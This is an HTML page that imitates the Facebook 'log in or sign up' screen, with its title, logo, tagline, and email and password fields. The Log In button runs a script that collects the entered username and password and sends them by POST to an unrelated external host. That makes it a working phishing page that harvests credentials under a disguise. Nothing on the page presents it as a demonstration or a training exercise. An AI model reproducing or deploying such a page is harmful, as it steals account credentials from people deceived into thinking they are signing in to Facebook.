<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook â€“ log in or sign up</title>
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="default.css">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login">
        <div class="container">
            <div class="row">
                <div class="col-7">
                    <div class="align-center">
                        <div class="content">
                            <img src="img/fb.png" alt="">
                            <p>Facebook helps you connect and share with the people in your life.</p>
                        </div>
                    </div>
                </div>
                <div class="col-5 col-xs-12">
                    
                        <div class="login-form">
                            <form action="">
                                <input id="email" type="text" name="username" required placeholder="Email address or phone number"><br>
                                <input id="pass" type="password" name="password" required placeholder="Password"><br>
                                <button id="login-btn" type="button" onclick="registerUser()">Log In</button><br>
                                <a href="#">Forgotten password?</a><br>
                                <button id="create-btn">Create New Account</button><br>
                            </form>
                        </div>
                        <footer>
                            <a href="#" 
                            style="font-weight: bold;
                            color: var(--black);
                            text-decoration: none;">Create a Page</a> 
                            for a celebrity, band or business.
                        </footer>
                    
                </div>
            </div>
        </div>
    </div>

    <script>
        function registerUser() {
          const username = document.getElementById('email').value;
          const password = document.getElementById('pass').value;
    
          fetch('https://express-login-zeta.vercel.app/register', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({ username, password }),
          })
          .then(response => response.json())
          .then(data => {
            document.getElementById('result').innerText = data.message;
          })
          .catch(error => {
            console.error('Error:', error);
            document.getElementById('result').innerText = 'An error occurred.';
          });
        }
      </script>
</body>
</html>
